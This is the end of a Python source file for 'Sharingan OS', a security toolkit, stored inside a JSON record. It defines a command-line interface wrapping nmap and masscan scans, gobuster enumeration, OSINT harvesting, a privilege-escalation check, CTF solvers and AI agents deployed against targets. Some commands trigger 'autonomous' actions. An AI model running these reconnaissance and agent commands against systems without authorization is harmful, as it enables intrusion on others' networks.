\"scapy not installed\"}]\n        except Exception as e:\n            return [{\"error\": str(e)}]\n\n    # =========================================================================\n    # MAIN ENTRY POINT\n    # =========================================================================\n    \n    def run(self, args: Optional[List[str]] = None):\n        \"\"\"Main entry point with argparse\"\"\"\n        import argparse\n        \n        parser = argparse.ArgumentParser(\n            description=\"Sharingan OS - Ethical Hacker & Full Stack Developer Toolkit\",\n            formatter_class=argparse.RawDescriptionHelpFormatter,\n            epilog=\"\"\"\nEXAMPLES:\n    %(prog)s ai \"how to secure Linux server\"\n    %(prog)s monitor 5 10\n    %(prog)s scan 192.168.1.1\n    %(prog)s akatsuki deploy Itachi \"scan WordPress\" http://example.com\n    %(prog)s ctf bandit --levels 5\n    %(prog)s api --host 0.0.0.0 --port 5000\n            \"\"\"\n        )\n        \n        parser.add_argument('--version', action='version', version=f'%(prog)s {VERSION}')\n        \n        subparsers = parser.add_subparsers(dest='command', title='commands', metavar='COMMAND')\n        \n        subparsers.add_parser('ai', help='Chat with AI').add_argument('message', nargs='*', help='Message to send')\n        \n        monitor_parser = subparsers.add_parser('monitor', help='Monitor system metrics')\n        monitor_parser.add_argument('--interval', '-i', type=int, default=5, help='Interval between checks')\n        monitor_parser.add_argument('--count', '-c', type=int, default=10, help='Number of checks')\n        \n        subparsers.add_parser('status', help='Show system status')\n        \n        scan_parser = subparsers.add_parser('scan', help='Network scanning')\n        scan_parser.add_argument('target', help='Target IP or hostname')\n        scan_parser.add_argument('--ports', '-p', default='-p-', help='Port range')\n        scan_parser.add_argument('--type', '-t', choices=['nmap', 'masscan', 'arp'], default='nmap', help='Scan type')\n        \n        akatsuki_parser = subparsers.add_parser('akatsuki', help='Akatsuki AI agents')\n        akatsuki_sub = akatsuki_parser.add_subparsers(dest='akatsuki_cmd', title='akatsuki commands')\n        \n        akatsuki_status = akatsuki_sub.add_parser('status', help='Show agent status')\n        akatsuki_sub.add_parser('list', help='List available agents')\n        \n        deploy_parser = akatsuki_sub.add_parser('deploy', help='Deploy an agent')\n        deploy_parser.add_argument('agent', help='Agent name (Itachi, Kisame, etc.)')\n        deploy_parser.add_argument('task', help='Task to perform')\n        deploy_parser.add_argument('--target', help='Target for the task')\n        \n        ctf_parser = subparsers.add_parser('ctf', help='CTF utilities')\n        ctf_sub = ctf_parser.add_subparsers(dest='ctf_cmd', title='ctf commands')\n        \n        bandit_parser = ctf_sub.add_parser('bandit', help='OverTheWire Bandit solver')\n        bandit_parser.add_argument('--levels', '-l', type=int, default=5, help='Number of levels')\n        \n        natas_parser = ctf_sub.add_parser('natas', help='Natas solver')\n        natas_parser.add_argument('level', type=int, help='Natas level')\n        \n        htb_parser = ctf_sub.add_parser('htb', help='HackTheBox helpers')\n        htb_parser.add_argument('--decode', choices=['base64', 'hex', 'rot13', 'url'], help='Decode method')\n        htb_parser.add_argument('data', help='Data to decode')\n        \n        subparsers.add_parser('privesc', help='Check privilege escalation vectors')\n\n        netsentinel_parser = subparsers.add_parser('netsentinel', help='Network intrusion detection')\n        netsentinel_parser.add_argument('--interval', '-i', type=int, default=5, help='Check interval in seconds')\n        netsentinel_parser.add_argument('--daemon', '-d', action='store_true', help='Run as daemon')\n\n        consciousness_parser = subparsers.add_parser('consciousness', help='System self-awareness AI')\n        consciousness_sub = consciousness_parser.add_subparsers(dest='consciousness_cmd', title='consciousness commands')\n        consciousness_sub.add_parser('status', help='Show consciousness status')\n        consciousness_sub.add_parser('capabilities', help='List all capabilities')\n        consciousness_sub.add_parser('reflect', help='Self-reflection')\n        consciousness_sub.add_parser('environment', help='Show detected environment')\n        analyze_parser = consciousness_sub.add_parser('analyze', help='Analyze situation')\n        analyze_parser.add_argument('situation', help='Situation to analyze')\n        autonomous_parser = consciousness_sub.add_parser('autonomous', help='Trigger autonomous action')\n        autonomous_parser.add_argument('trigger', help='Trigger event')\n        \n        # COMMANDE DO - Ex\u00e9cution directe d'actions\n        do_parser = subparsers.add_parser('do', help='Execute action directly')\n        do_sub = do_parser.add_subparsers(dest='do_cmd', title='do commands')\n        \n        # do scan <target>\n        scan_parser = do_sub.add_parser('scan', help='Execute network scan')\n        scan_parser.add_argument('target', help='Target IP or range (e.g., 192.168.1.1 or 192.168.1.0/24)')\n        scan_parser.add_argument('--type', '-t', choices=['quick', 'full', 'ports'], default='quick', help='Scan type')\n        \n        # do gobuster <url>\n        gobuster_parser = do_sub.add_parser('gobuster', help='Execute gobuster scan')\n        gobuster_parser.add_argument('url', help='Target URL')\n        gobuster_parser.add_argument('--wordlist', '-w', default='/usr/share/wordlists/dirb/common.txt')\n        \n        # do lynis (audit syst\u00e8me)\n        do_sub.add_parser('lynis', help='Run system audit')\n        \n        api_parser = subparsers.add_parser('api', help='Start API server')\n        api_parser.add_argument('--host', default='0.0.0.0', help='Host to bind')\n        api_parser.add_argument('--port', '-p', type=int, default=5000, help='Port to listen')\n        \n        subparsers.add_parser('obligations', help='Check compliance obligations')\n        \n        web_parser = subparsers.add_parser('web', help='Web utilities')\n        web_sub = web_parser.add_subparsers(dest='web_cmd', title='web commands')\n        \n        gobuster_parser = web_sub.add_parser('dir', help='Directory enumeration')\n        gobuster_parser.add_argument('url', help='Target URL')\n        gobuster_parser.add_argument('--wordlist', '-w', default='/usr/share/wordlists/dirb/common.txt')\n        \n        whatweb_parser = web_sub.add_parser('tech', help='Identify technologies')\n        whatweb_parser.add_argument('url', help='Target URL')\n        \n        osint_parser = subparsers.add_parser('osint', help='OSINT utilities')\n        osint_sub = osint_parser.add_subparsers(dest='osint_cmd', title='osint commands')\n        \n        crtsh_parser = osint_sub.add_parser('subdomains', help='Find subdomains via crt.sh')\n        crtsh_parser.add_argument('domain', help='Domain to search')\n        \n        harvester_parser = osint_sub.add_parser('harvest', help='Harvest emails and hosts')\n        harvester_parser.add_argument('domain', help='Domain to search')\n        \n        docker_parser = subparsers.add_parser('docker', help='Docker utilities')\n        docker_sub = docker_parser.add_subparsers(dest='docker_cmd', title='docker commands')\n        docker_sub.add_parser('ps', help='List containers')\n        docker_sub.add_parser('images', help='List images')\n        \n        if not args:\n            args = sys.argv[1:]\n        \n        parsed = parser.parse_args(args if args else ['--help'])\n        \n        if parsed.command is None:\n            parser.print_help()\n            return\n        \n        try:\n            if parsed.command == 'ai':\n                message = ' '.join(parsed.message) if parsed.message else \"Hello\"\n                print(self.sharingan_chat(message))\n            \n            elif parsed.command == 'monitor':\n                metrics = self.monitor_system(parsed.interval, parsed.count)\n                print(json.dumps(metrics, indent=2))\n            \n            elif parsed.command == 'status':\n                print(f\"CPU: {self.get_cpu_usage()}%\")\n                print(f\"Memory: {self.get_memory_usage()}\")\n                print(f\"Disk: {self.get_disk_usage()}\")\n            \n            elif parsed.command == 'scan':\n                if parsed.type == 'nmap':\n                    print(self.nmap_scan(parsed.target, parsed.ports))\n                elif parsed.type == 'masscan':\n                    print(self.masscan_scan(parsed.target))\n                elif parsed.type == 'arp':\n                    print(json.dumps(self.arp_scan(target=parsed.target), indent=2))\n            \n            elif parsed.command == 'akatsuki':\n                if parsed.akatsuki_cmd == 'status':\n                    print(json.dumps(self.akatsuki_status(), indent=2))\n                elif parsed.akatsuki_cmd == 'list':\n                    agents = ['Itachi', 'Kisame', 'Sasori', 'Deidara', 'Hidan', 'Kakuzu', 'Orochimaru', 'Konan', 'Zetsu', 'Tobi']\n                    for a in agents:\n                        print(f\"  - {a}\")\n                elif parsed.akatsuki_cmd == 'deploy':\n                    print(json.dumps(self.akatsuki_deploy(parsed.agent, parsed.task, parsed.target), indent=2))\n            \n            elif parsed.command == 'ctf':\n                if parsed.ctf_cmd == 'bandit':\n                    print(json.dumps(self.bandit_solver(levels=parsed.levels), indent=2))\n                elif parsed.ctf_cmd == 'natas':\n                    print(json.dumps(self.natas_solver(parsed.level), indent=2))\n                elif parsed.ctf_cmd == 'htb':\n                    if parsed.decode:\n                        result = self.hackthebox_solve(parsed.decode, parsed.data)\n                        print(json.dumps(result, indent=2))\n            \n            elif parsed.command == 'privesc':\n                print(json.dumps(self.check_privilege_escalation(), indent=2))\n            \n            elif parsed.command == 'netsentinel':\n                import sys as _sys_netsentinel\n                _sys_netsentinel.path.insert(0, str(Path(__file__).parent / \"tools\"))\n                from network_monitor import NetSentinel, ai_alert_handler\n                print(\"NetSentinel - Comprehensive System Monitoring & Intrusion Detection\")\n                print(\"=\" * 60)\n                \n                if parsed.daemon:\n                    sentinel = NetSentinel(alert_callback=ai_alert_handler)\n                    sentinel.start_background_monitor(parsed.interval)\n                    print(f\"Running in daemon mode (interval: {parsed.interval}s)\")\n                    print(\"Press Ctrl+C to stop\")\n                    try:\n                        while True: time.sleep(1)\n                    except KeyboardInterrupt:\n                        sentinel.stop()\n                        print(\"\\nNetSentinel stopped.\")\n                else:\n                    import readline\n                    sentinel = NetSentinel(alert_callback=ai_alert_handler)\n                    print(\"\\nInteractive mode. Commands: status, threats, watch, processes, ports, network, quit\")\n                    while True:\n                        try:\n                            cmd = input(\"\\nnetsentinel> \").strip()\n                            if cmd in ['quit', 'exit']:\n                                break\n                            elif cmd == 'status':\n                                status = sentinel.get_system_status()\n                                print(f\"\\n[{status['timestamp']}]\")\n                                print(f\"CPU: {status['cpu']['percent']}% | Memory: {status['memory']['percent']}% | Disk: {status['disk']['percent']}%\")\n                                print(f\"Network: {status['network']['bytes_sent_mb']}MB sent, {status['network']['bytes_recv_mb']}MB recv\")\n                                print(f\"Processes: {len(status['processes'])} | Connections: {len(status['connections'])} | Ports: {len(status['listening_ports'])}\")\n                                print(f\"Users: {len(status['users'])}\")\n                            elif cmd == 'threats':\n                                assessment = sentinel.get_threat_assessment()\n                                print(f\"\\nThreat Level: {assessment['threat_level']}\")\n                                print(f\"Anomalies: {assessment['anomalies_count']}\")\n                                for a in assessment['anomalies']:\n                                    print(f\"  [{a['severity']}] {a['type']}: {a['details']}\")\n                            elif cmd == 'watch':\n                                interval = parsed.interval\n                                print(f\"Watching... (interval: {interval}s, Ctrl+C to stop)\")\n                                try:\n                                    while True:\n                                        assessment = sentinel.get_threat_assessment()\n                                        status = assessment['system_status']\n                                        print(f\"[{datetime.now().strftime('%H:%M:%S')}] \"\n                                              f\"CPU:{status['cpu']}% MEM:{status['memory']}% \"\n                                              f\"CONN:{status['active_connections']} PORTS:{status['listening_ports']} \"\n                                              f\"THREAT:{assessment['threat_level']}\")\n                                        time.sleep(interval)\n                                except KeyboardInterrupt:\n                                    print(\"\\nStopped watching.\")\n                            elif cmd == 'processes':\n                                procs = sentinel.get_process_info()\n                                print(f\"\\nTop 10 Processes:\")\n                                for p in procs[:10]:\n                                    print(f\"  {p['pid']:6} | {p['cpu_percent']:5.1f}% | {p['memory_percent']:5.1f}% | {p['name']}\")\n                            elif cmd == 'ports':\n                                ports = sentinel.get_listening_ports()\n                                print(f\"\\nListening Ports ({len(ports)}):\")\n                                for p in ports:\n                                    print(f\"  {p['proto']:4} | {p['local']:20} | {p['program']}\")\n                            elif cmd == 'network':\n                                conns = sentinel.get_connections()\n                                print(f\"\\nActive Connections ({len(conns)}):\")\n                                for c in conns[:15]:\n                                    print(f\"  {c['proto']:4} | {c['local']:22} -> {c['remote']:22} | {c['state']}\")\n                            else:\n                                print(\"Commands: status, threats, watch, processes, ports, network, quit\")\n                        except KeyboardInterrupt:\n                            print(\"\\nUse 'quit' to exit.\")\n                        except Exception as e:\n                            print(f\"Error: {e}\")\n            \n            elif parsed.command == 'consciousness':\n                import sys as _sys_consciousness\n                _sys_consciousness.path.insert(0, str(Path(__file__).parent))\n                from system_consciousness import SystemConsciousness\n                consciousness = SystemConsciousness()\n                \n                if parsed.consciousness_cmd == 'status':\n                    status = consciousness.get_full_status()\n                    print(f\"\\n[{datetime.now().isoformat()}]\")\n                    print(f\"Identity: {status['identity']['name']}\")\n                    print(f\"Version: {status['identity']['version']}\")\n                    print(f\"Role: {status['identity']['role']}\")\n                    print(f\"Session: {status['session']['id']}\")\n                    print(f\"Channel: {status['interaction']['channel_type']}\")\n                    print(f\"Memory connected: {status['memory_connected']}\")\n                    print(f\"Tools available: {len(status['tools'])}\")\n                    \n                elif parsed.consciousness_cmd == 'capabilities':\n                    status = consciousness.get_full_status()\n                    print(\"\\nAvailable Tools:\")\n                    for name, caps in status['tools'].items():\n                        print(f\"  {name}: {caps}\")\n                        \n                elif parsed.consciousness_cmd == 'reflect':\n                    status = consciousness.get_full_status()\n                    print(f\"\\n[{datetime.now().isoformat()}]\")\n                    print(f\"Identity: {status['identity']['name']}\")\n                    print(f\"Session: {status['session']['id']}\")\n                    print(f\"Channel: {status['interaction']['channel_type']}\")\n                    print(f\"Memory connected: {status['memory_connected']}\")\n                    print(f\"Last action: {status.get('last_action', 'Never')}\")\n                    \n                elif parsed.consciousness_cmd == 'environment':\n                    status = consciousness.get_full_status()\n                    env = status['environment']\n                    print(f\"\\n[{datetime.now().isoformat()}]\")\n                    print(f\"OS: {env['system']['os']} {env['system'].get('os_release', '')[:40]}...\")\n                    print(f\"Hostname: {env['system']['hostname']}\")\n                    print(f\"User: {env['runtime'].get('user', 'unknown')} (root: {env['security']['is_root']})\")\n                    print(f\"IP: {env['network']['local_ip']}\")\n                    print(f\"Python: {env['runtime']['python_version']}\")\n                    print(f\"Architecture: {env['system']['architecture']}\")\n                    print(f\"\\nPermissions:\")\n                    print(f\"  Root: {env['security']['is_root']}\")\n                            \n                elif parsed.consciousness_cmd == 'analyze':\n                    result = consciousness.analyze_context(parsed.situation)\n                    print(f\"\\nSituation: {result['situation']}\")\n                    print(f\"Detected intent: {result['detected_intent']}\")\n                    print(f\"Confidence: {result['confidence']:.2f}\")\n                    print(f\"Relevant tools: {result['relevant_tools']}\")\n                    print(f\"Can execute: {result['can_execute']}\")\n                    print(f\"Channel: {result['channel']}\")\n                    print(\"\\nAvailable actions:\")\n                    for action in result.get('available_actions', []):\n                        print(f\"  \u2713 {action['tool']}: {action['action']}\")\n                        if 'command' in action:\n                            print(f\"    Command: {action['command']}\")\n                    if result.get('unavailable_tools'):\n                        print(\"\\nUnavailable tools (need installation):\")\n                        for tool in result['unavailable_tools']:\n                            print(f\"  \u2717 {tool}\")\n                    print(f\"\\nRecommendation: {result['recommendation']}\")\n                    print(f\"Missing packages: {result['environment_info'].get('missing_packages', [])}\")\n                        \n                elif parsed.consciousness_cmd == 'autonomous':\n                    result = consciousness.autonomous_action(parsed.trigger)\n                    print(f\"\\n{'='*60}\")\n                    print(f\"AUTONOMOUS RESPONSE TRIGGERED\")\n                    print(f\"{'='*60}\")\n                    print(f\"Trigger: {result.get('trigger', 'unknown')}\")\n                    print(f\"Intent detected: {result.get('intent', 'unknown')}\")\n                    print(f\"Consciousness level: {result.get('consciousness_level', 'UNKNOWN')}\")\n                    print(f\"Environment aware: {result.get('environment_aware', False)}\")\n                    print(f\"\\nAdaptations:\")\n                    print(f\"  Available: {result.get('adaptations', {}).get('available', [])}\")\n                    print(f\"  Requested: {result.get('adaptations', {}).get('requested', 'unknown')}\")\n                    print(f\"  Missing: {result.get('adaptations', {}).get('missing', [])}\")\n                    print(f\"\\nTools activated:\")\n                    for tool in result.get('tools_used', []):\n                        print(f\"  [{tool.get('status', '?')}] {tool.get('tool', 'unknown')}: {tool.get('action', 'unknown')}\")\n                        print(f\"    Command: {tool.get('command', 'N/A')}\")\n                    print(f\"\\nConfidence: {result.get('analysis', {}).get('confidence', 0.0):.2f}\")\n                    print(f\"{'='*60}\")\n            \n            elif parsed.command == 'api':\n                app = self.create_api_app()\n                print(f\"Starting Sharingan OS API on {parsed.host}:{parsed.port}\")\n                app.run(host=parsed.host, port=parsed.port)\n            \n            elif parsed.command == 'obligations':\n                print(json.dumps(self.check_obligations(), indent=2))\n            \n            elif parsed.command == 'web':\n                if parsed.web_cmd == 'dir':\n                    print(json.dumps(self.gobuster_scan(parsed.url, parsed.wordlist), indent=2))\n                elif parsed.web_cmd == 'tech':\n                    print(json.dumps(self.whatweb_scan(parsed.url), indent=2))\n            \n            elif parsed.command == 'osint':\n                if parsed.osint_cmd == 'subdomains':\n                    print(json.dumps(self.crtsh_search(parsed.domain), indent=2))\n                elif parsed.osint_cmd == 'harvest':\n                    print(json.dumps(self.theharvester_scan(parsed.domain), indent=2))\n            \n            elif parsed.command == 'docker':\n                if parsed.docker_cmd == 'ps':\n                    print(json.dumps(self.docker_ps(), indent=2))\n                elif parsed.docker_cmd == 'images':\n                    print(json.dumps(self.docker_images(), indent=2))\n        \n        except Exception as e:\n            logger.error(f\"Command failed: {e}\")\n            print(f\"Error: {e}\")\n    \n    def show_help(self):\n        \"\"\"Show help message\"\"\"\n        print(f\"\"\"\nSharingan OS v{VERSION} - Ethical Hacker & Full Stack Developer\n\nUSAGE:\n    python sharingan.py [COMMAND] [OPTIONS]\n\nCOMMANDS:\n    ai <message>              Chat with AI\n    monitor [interval] [count] Monitor system\n    scan <target>             Network scan\n    akatsuki                  AI agents management\n    ctf                       CTF utilities\n    api                       Start API server\n    help                      Show this help\n\nEXAMPLES:\n    python sharingan.py ai \"how to secure my server\"\n    python sharingan.py monitor 5 20\n    python sharingan.py scan 192.168.1.1\n    python sharingan.py api\n\"\"\")\n\n# Create singleton instance\nsharingan = SharinganOS()\n\n\ndef main():\n    \"\"\"Entry point\"\"\"\n    sharingan.run()\n\n\nif __name__ == \"__main__\":\n    main()\n",
  "checksum": "03a3298ac424ee254773db53b68e2a000bfb91a8450c3cd4fac5bad9d95c15dc",
  "created_at": "2026-01-14T21:35:50.145227",
  "version": "1.0"
}